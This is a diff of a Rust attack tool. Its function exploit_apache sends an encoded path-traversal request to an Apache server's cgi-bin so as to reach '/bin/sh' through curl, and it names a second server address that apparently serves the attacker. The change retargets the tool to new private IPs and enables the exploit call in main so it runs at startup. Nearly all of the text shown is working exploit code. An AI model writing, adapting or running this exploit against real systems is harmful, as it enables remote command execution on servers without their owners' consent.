@@ -60,7 +60,7 @@ pub async fn get_apache_headers(target: String) -> Result<(), reqwest::Error> {
 
 async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let url = format!("http://{}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh", target_ip);
-    let srv:String = format!("192.168.1.41");
+    let srv:String = format!("10.0.0.5");
 
     let command_output: Output = Command::new("curl")
         .arg("-X")
@@ -84,14 +84,14 @@ async fn exploit_apache(target_ip: &str) -> Result<(), Box<dyn std::error::Error
 
 #[tokio::main]
 async fn main() {
-    let ip_address = "192.168.1.122";
+    let ip_address = "10.0.0.6";
     let url = format!("http://{}",ip_address);
 
     //match ping_ip(ip_address) {
     //    Ok(_) => scan_ports(ip_address),
     //    Err(_) => {}
     //}
-    //exploit_apache(ip_address).await.expect("TODO: panic message");
+    exploit_apache(ip_address).await.expect("TODO: panic message");
 
     //get_apache_headers(ip_address.to_string()).await;
 }
